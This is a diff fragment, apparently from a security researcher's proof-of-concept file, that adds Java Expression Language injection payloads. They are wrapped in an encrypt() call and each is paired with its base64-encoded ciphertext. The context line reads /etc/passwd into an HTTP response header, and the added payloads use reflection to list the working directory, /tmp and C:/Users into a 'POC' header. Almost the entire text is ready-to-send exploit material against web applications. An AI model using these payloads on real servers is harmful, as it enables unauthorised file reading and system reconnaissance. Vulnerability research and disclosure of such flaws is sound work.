@@ -202,3 +202,15 @@ uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGp
 
 payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", new java.util.Scanner(new java.io.FileInputStream(\"/etc/passwd\"), \"UTF-8\").useDelimiter(\"\\\\A\").next())}")
 uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe70zyWF0MVT37DZc1LFEcEY3OVNTi22+Lki8HrzPO53Va7WeTRW8p882EK+0AcvWx/dosDpl5jPn6GnFfbiDuncshcdcViXFgHPzfuVLPM3TJ/PmqVFG++H4yWHbfr1ysbIZq7tXq5Gc4RKDS0Z//c34I=
+
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", java.util.Arrays.toString(\"\".getClass().forName(\"java.io.File\").getConstructor(\"\".getClass()).newInstance(System.getProperty(\"user.dir\")).list())))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxbrty1Q8kdF1NAQE/IVtCzU6+L3EAyJD7v68g4UUhVeNcjBOYGqxZf9RbkalWJkapsN77q/Q8flJzTc9d1mQH0SzzXYO8suUZGCtaHm89JO3ZSdTaPFODuk+Kr/RnJKS+iAX0eHzb18Dj4lMoih8mrp/pIHfby+fyeO/eLjCz6FJGXJrTbrBLcKlcT3VuHf6eoexSfVQ0fdNA72OXNST6Ia
+
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", java.util.Arrays.toString(\"\".getClass().forName(\"java.io.File\").getConstructor(\"\".getClass()).newInstance(\"/tmp\").list())))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxbrty1Q8kdF1NAQE/IVtCzU6+L3EAyJD7v68g4UUhVeNcjBOYGqxZf9RbkalWJkapsN77q/Q8flJzTc9d1mQH0SzzXYO8suUZGCtaHm89JO3ZSdTaPFODuk+Kr/RnJKS+iAX0eHzb18Dudz0Tq6fXisso61x7nnXmlLcWnnz3Lii1rsK8fjkXsJ
+
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", java.util.Arrays.toString(\"\".getClass().forName(\"java.io.File\").getConstructor(\"\".getClass()).newInstance(\"C:/Users\").list())))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxbrty1Q8kdF1NAQE/IVtCzU6+L3EAyJD7v68g4UUhVeNcjBOYGqxZf9RbkalWJkapsN77q/Q8flJzTc9d1mQH0SzzXYO8suUZGCtaHm89JO3ZSdTaPFODuk+Kr/RnJKS+iAX0eHzb18Dudz0Tq6fXis56Pwa7srXFOXdAUtcWZReO0y00zEe0Un
